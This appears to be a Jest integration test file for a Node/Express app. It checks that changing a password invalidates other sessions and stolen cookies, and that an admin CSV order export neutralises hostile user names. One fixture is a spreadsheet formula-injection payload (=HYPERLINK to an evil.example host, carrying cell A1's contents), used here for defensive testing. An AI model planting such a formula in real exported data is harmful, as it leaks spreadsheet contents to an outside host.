// Batch 5 against a REAL MongoDB and the REAL connect-mongo session store (unit tests mock both):
//   1. PUT /api/users/password — the new password really works, the old one really stops working, every OTHER
//      stored session of the user is really deleted, THIS device keeps a working (new) session.
//   2. GET /api/admin/export/orders — real orders by users with hostile names, read back with an independent CSV parser.
//
// NOT executed in the sandbox this was written in (no MongoDB reachable). Run:  npm run test:integration

const mongoose = require("mongoose");
const bcrypt = require("bcryptjs");
const { MongoStore } = require("connect-mongo");
const { createApp } = require("../../server");
const { loadConfig } = require("../../config/env");
const User = require("../../models/User");
const { connectTestDb, clearTestDb, disconnectTestDb, DB_NAME } = require("../helpers/db");
const { createUser, createFood, loginAgent, PASSWORD, ORDER_BODY } = require("../helpers/factories");
const { newAgent, refreshCsrf, anonymous, cookieHeader } = require("../helpers/client");
const { parseCsv } = require("../helpers/csv");

jest.setTimeout(30000);

const NEXT = "brandNew456";
let app;
let strictApp; // same, but with the password-change limiter ENABLED (limit 2)

const buildApp = (env, rateLimits) =>
  createApp(loadConfig({ NODE_ENV: "test", SESSION_SECRET: "integration-secret", ...env }), {
    sessionStore: new MongoStore({ client: mongoose.connection.getClient(), dbName: DB_NAME, touchAfter: 0 }),
    ...(rateLimits ? { rateLimits } : {}),
  });

beforeAll(async () => {
  await connectTestDb();
  app = buildApp({ RATE_LIMIT_DISABLED: "true" });
  strictApp = buildApp({ RATE_LIMIT_DISABLED: "false" }, { passwordChange: { limit: 2 } });
});
beforeEach(clearTestDb);
afterAll(disconnectTestDb);

const sessionsOf = (user) =>
  mongoose.connection.collection("sessions").countDocuments({ session: { $regex: `"userId":"${user.id}"` } });
const storedHash = async (user) => (await User.findById(user._id).select("+password")).password;
const change = (agent, currentPassword, newPassword) => agent.put("/api/users/password").send({ currentPassword, newPassword });
const tryLogin = async (email, password) => (await newAgent(app)).post("/api/auth/login").send({ email, password });

describe("PUT /api/users/password — against MongoDB", () => {
  test("success: the new password logs in, the old one no longer does, and the stored value is a fresh bcrypt hash", async () => {
    const user = await createUser();
    const before = await storedHash(user);
    const agent = await loginAgent(app, user);

    const res = await change(agent, PASSWORD, NEXT);

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    const after = await storedHash(user);
    expect(after).not.toBe(before);
    expect(after).not.toBe(NEXT);
    expect(after).toMatch(/^\$2[aby]\$/);
    expect(await bcrypt.compare(NEXT, after)).toBe(true);

    expect((await tryLogin(user.email, NEXT)).status).toBe(200);
    expect((await tryLogin(user.email, PASSWORD)).status).toBe(401);
  });

  test("every OTHER device is signed out; this device stays signed in on a NEW session", async () => {
    const user = await createUser();
    const phone = await loginAgent(app, user);
    const laptop = await loginAgent(app, user);
    const tablet = await loginAgent(app, user);
    expect(await sessionsOf(user)).toBe(3);

    const res = await change(phone, PASSWORD, NEXT);

    expect(res.status).toBe(200);
    // the three old sessions are gone; exactly one (the replacement for `phone`) exists
    expect(await sessionsOf(user)).toBe(1);
    expect((await laptop.get("/api/auth/me")).status).toBe(401);
    expect((await tablet.get("/api/auth/me")).status).toBe(401);
    // this device: still logged in, as the same person
    const me = await phone.get("/api/auth/me");
    expect(me.status).toBe(200);
    expect(me.body.data.user.email).toBe(user.email);
    // …and it can keep working after fetching a fresh CSRF token (the old one belonged to the old session)
    const stale = await phone.put("/api/users/profile").send({ name: "Renamed Once" });
    expect(stale.status).toBe(403);
    await refreshCsrf(phone);
    expect((await phone.put("/api/users/profile").send({ name: "Renamed Once" })).status).toBe(200);
  });

  test("a stolen OLD session cookie stops working: the old session id no longer exists", async () => {
    const user = await createUser();
    const agent = await loginAgent(app, user);
    const oldCookie = cookieHeader(agent); // what an attacker who copied the cookie would send

    await change(agent, PASSWORD, NEXT);

    const replay = await (await anonymous(app)).get("/api/auth/me").set("Cookie", oldCookie);
    expect(replay.status).toBe(401);
  });

  test("other users' sessions are untouched", async () => {
    const user = await createUser();
    const bystander = await createUser();
    const mine = await loginAgent(app, user);
    const theirs = await loginAgent(app, bystander);

    expect((await change(mine, PASSWORD, NEXT)).status).toBe(200);

    expect(await sessionsOf(bystander)).toBe(1);
    expect((await theirs.get("/api/auth/me")).status).toBe(200);
  });

  test("WRONG current password → 400: nothing changes — same hash, other devices still signed in", async () => {
    const user = await createUser();
    const before = await storedHash(user);
    const phone = await loginAgent(app, user);
    const laptop = await loginAgent(app, user);

    const res = await change(phone, "definitely-wrong", NEXT);

    expect(res.status).toBe(400);
    expect(res.body.message).toBe("Current password is incorrect");
    expect(await storedHash(user)).toBe(before);
    expect(await sessionsOf(user)).toBe(2);
    expect((await laptop.get("/api/auth/me")).status).toBe(200);
    expect((await phone.get("/api/auth/me")).status).toBe(200);
    expect((await tryLogin(user.email, PASSWORD)).status).toBe(200); // the old password still works
    expect((await tryLogin(user.email, NEXT)).status).toBe(401);
  });

  test.each([
    ["same as the current password", () => [PASSWORD, PASSWORD]],
    ["too short", () => [PASSWORD, "abc12"]],
    ["longer than 72 characters", () => [PASSWORD, "p".repeat(73)]],
    ["missing", () => [PASSWORD, undefined]],
  ])("a rejected new password (%s) changes nothing in the database", async (_label, build) => {
    const user = await createUser();
    const before = await storedHash(user);
    const other = await loginAgent(app, user);
    const agent = await loginAgent(app, user);
    const [current, next] = build();

    const res = await agent.put("/api/users/password").send({ currentPassword: current, newPassword: next });

    expect(res.status).toBe(400);
    expect(await storedHash(user)).toBe(before);
    expect(await sessionsOf(user)).toBe(2);
    expect((await other.get("/api/auth/me")).status).toBe(200);
  });

  test("a 72-character password is accepted and works at login", async () => {
    const user = await createUser();
    const agent = await loginAgent(app, user);
    const long = "L".repeat(72);

    expect((await change(agent, PASSWORD, long)).status).toBe(200);
    expect((await tryLogin(user.email, long)).status).toBe(200);
  });

  test("a user can change the password again right away (fresh token), and only the latest password works", async () => {
    const user = await createUser();
    const agent = await loginAgent(app, user);

    expect((await change(agent, PASSWORD, NEXT)).status).toBe(200);
    await refreshCsrf(agent);
    expect((await change(agent, NEXT, "third-pass-789")).status).toBe(200);

    expect((await tryLogin(user.email, "third-pass-789")).status).toBe(200);
    expect((await tryLogin(user.email, NEXT)).status).toBe(401);
    expect((await tryLogin(user.email, PASSWORD)).status).toBe(401);
  });

  test("an admin keeps the admin role (and admin access) after changing the password", async () => {
    const admin = await createUser({ role: "admin" });
    const agent = await loginAgent(app, admin);

    expect((await change(agent, PASSWORD, NEXT)).status).toBe(200);

    expect((await agent.get("/api/admin/users")).status).toBe(200);
    expect((await User.findById(admin._id)).role).toBe("admin");
  });

  test("a deactivated account cannot change its password (session refused, hash unchanged)", async () => {
    const user = await createUser();
    const before = await storedHash(user);
    const agent = await loginAgent(app, user);
    await User.updateOne({ _id: user._id }, { $set: { isActive: false } });

    const res = await change(agent, PASSWORD, NEXT);

    expect(res.status).toBe(401);
    expect(await storedHash(user)).toBe(before);
  });

  test("the brute-force limiter: after 2 wrong guesses even the CORRECT password is refused (429), and nothing changed", async () => {
    const user = await createUser();
    const before = await storedHash(user);
    const agent = await loginAgent(strictApp, user);

    expect((await change(agent, "guess-number-1", NEXT)).status).toBe(400);
    expect((await change(agent, "guess-number-2", NEXT)).status).toBe(400);
    const blocked = await change(agent, PASSWORD, NEXT);

    expect(blocked.status).toBe(429);
    expect(blocked.body.limiter).toBe("passwordChange");
    expect(await storedHash(user)).toBe(before);
  });

  test("the response and the database never contain the plain-text password", async () => {
    const user = await createUser();
    const agent = await loginAgent(app, user);

    const res = await change(agent, PASSWORD, NEXT);

    expect(JSON.stringify(res.body)).not.toContain(NEXT);
    expect(JSON.stringify(res.body)).not.toContain(PASSWORD);
    const raw = await mongoose.connection.collection("users").findOne({ _id: user._id });
    expect(JSON.stringify(raw)).not.toContain(NEXT);
  });
});

describe("CSV export — real orders by users with hostile names", () => {
  const HOSTILE_NAMES = [
    '=HYPERLINK("http://evil.example/?"&A1,"click")',
    "+1+1",
    "@SUM(1+1)",
    "Smith, John",
    'Dwayne "The Rock" J',
  ];

  const orderAs = async (user, food) => {
    const agent = await loginAgent(app, user);
    expect((await agent.post("/api/cart").send({ foodId: food.id, quantity: 2 })).status).toBe(200);
    const res = await agent.post("/api/orders").send(ORDER_BODY);
    expect(res.status).toBe(201);
  };

  test("a customer can really register under a formula name (the attack is reachable through the API)…", async () => {
    const agent = await newAgent(app);
    const res = await agent.post("/api/auth/register").send({ name: HOSTILE_NAMES[0], email: "evil@example.com", password: PASSWORD });
    expect(res.status).toBe(201);
    expect((await User.findOne({ email: "evil@example.com" })).name).toBe(HOSTILE_NAMES[0]);
  });

  test("…and the export keeps every row at 7 columns with each formula neutralised and names intact", async () => {
    const food = await createFood({ price: 120 });
    const emails = [];
    for (const name of HOSTILE_NAMES) {
      const user = await createUser({ name });
      emails.push(user.email);
      await orderAs(user, food);
    }
    const admin = await createUser({ role: "admin" });
    const adminAgent = await loginAgent(app, admin);

    const res = await adminAgent.get("/api/admin/export/orders");

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/^text\/csv/);
    const rows = parseCsv(res.text);
    expect(rows[0]).toEqual(["Order ID", "User Name", "User Email", "Total Amount", "Status", "Payment Method", "Date"]);
    expect(rows).toHaveLength(HOSTILE_NAMES.length + 1);
    rows.forEach((row) => expect(row).toHaveLength(7));

    const byEmail = Object.fromEntries(rows.slice(1).map((r) => [r[2], r]));
    HOSTILE_NAMES.forEach((name, i) => {
      const row = byEmail[emails[i]];
      expect(row).toBeDefined();
      expect(row[1]).toBe(/^[=+\-@]/.test(name) ? `'${name}` : name); // dangerous start → inert, the rest verbatim
      expect(/^[=+\-@\t\r]/.test(row[1])).toBe(false);
      expect(row[3]).toBe("240"); // 2 × 120 — numbers are never altered
      expect(row[4]).toBe("Pending");
      expect(row[5]).toBe("Cash on Delivery");
    });
  });

  test("an export with NO orders is a valid CSV that contains just the header row", async () => {
    const admin = await createUser({ role: "admin" });
    const res = await (await loginAgent(app, admin)).get("/api/admin/export/orders");

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/^text\/csv/);
    expect(parseCsv(res.text)).toEqual([["Order ID", "User Name", "User Email", "Total Amount", "Status", "Payment Method", "Date"]]);
  });

  test("the export is still admin-only", async () => {
    const customer = await createUser();
    const agent = await loginAgent(app, customer);
    expect((await agent.get("/api/admin/export/orders")).status).toBe(403);
  });
});
